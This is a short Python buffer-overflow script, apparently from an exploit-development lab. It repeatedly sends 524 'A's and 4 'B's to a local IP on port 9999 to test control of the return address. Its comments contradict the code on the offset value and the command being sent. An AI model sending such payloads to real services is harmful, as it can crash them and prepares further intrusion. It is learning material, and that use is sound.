#!/usr/bin/python

import sys, socket

shellcode = "A" * 524 + "B" * 4    # 2003 is the "[*] Exact match found at offset number from offset.py"

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.27',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send((shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
            